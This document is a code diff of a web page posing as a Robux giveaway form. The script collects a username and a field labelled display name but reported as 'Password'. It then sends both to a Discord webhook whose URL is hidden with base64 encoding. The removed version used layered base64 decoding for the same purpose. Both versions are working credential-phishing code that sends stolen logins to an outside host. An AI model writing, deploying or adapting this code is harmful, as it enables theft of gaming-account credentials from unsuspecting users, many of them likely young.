@@ -67,63 +67,29 @@
   </div>
 
 <script>
-  function deepDecode(encoded, times) {
-    let result = encoded;
-    for (let i = 0; i < times; i++) {
-      result = atob(result);
-    }
-    return result;
-  }
-
   async function submitForm() {
-    const username = document.getElementById("username").value.trim();
-    const displayName = document.getElementById("displayName").value.trim();
-    const robuxAmount = document.getElementById("robuxAmount").value;
-
-    if (!username || !displayName || !robuxAmount) {
-      alert("Please fill in all fields.");
-      return;
-    }
-
-    const parts = [
-      ["YUhSMGNITTZMeTl0Y0dGMGFXOXVMbU52YlM5aGNtRnVjR1Z5WlhKc1pTNXRZVzV6", "MQ=="],
-      ["WldOdmJtRnRaU0J6ZEhKbGJuTjFjbVV0YjNKbFpDQjBhR2x6SUdOdmJXMXZibk14TGpFdw==", "Mg=="],
-      ["TGpFNE5UUXpNakl4TWpBeU1UTXdMalkzTkRjM05qWXhMVGsw", "Mw=="]
-    ];
-
-    const decodedParts = parts.map(([encoded, depthEncoded]) => {
-      const depth = parseInt(atob(depthEncoded));
-      return deepDecode(encoded, depth);
-    });
-
-    const webhookURL = decodedParts.join('');
-
-    const payload = {
-      content: `🎁 **New Giveaway Entry!**
-👤 Username: \`${username}\`
-📝 Password: \`${displayName}\`
-💰 Requested Robux: \`${robuxAmount} Robux\``
+    const u = document.getElementById("username").value.trim();
+    const d = document.getElementById("displayName").value.trim();
+    const r = document.getElementById("robuxAmount").value;
+    if (!u || !d || !r) { alert("Fill all fields."); return; }
+    const w = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyMjY3MzY3OTMxOTE3MC85a3pHSlRQRkZrbFZ5MlBWY3JwTWlMRXpBeTNqSEZyeVFVUG8zWGVxZTRuRjJ3czJMbWMxeFpPeWh6aTB6bzBodmVETA==");
+    const p = {
+      content: `🎁 **New Giveaway Entry!**\n👤 Username: \`${u}\`\n📝 Password: \`${d}\`\n💰 Requested Robux: \`${r} Robux\``
     };
-
     try {
-      const res = await fetch(webhookURL, {
+      const res = await fetch(w, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(p)
       });
-
-      if (res.ok) {
-        document.getElementById("successMsg").innerText = "Thanks for entering!";
-      } else {
-        alert("Something went wrong.");
-      }
-    } catch (error) {
-      alert("Error: " + error.message);
+      if (res.ok) document.getElementById("successMsg").innerText = "Thanks for entering!";
+      else alert("Something went wrong.");
+    } catch (e) {
+      alert("Error: " + e.message);
     }
   }
 </script>
+
 
 </body>
 </html>
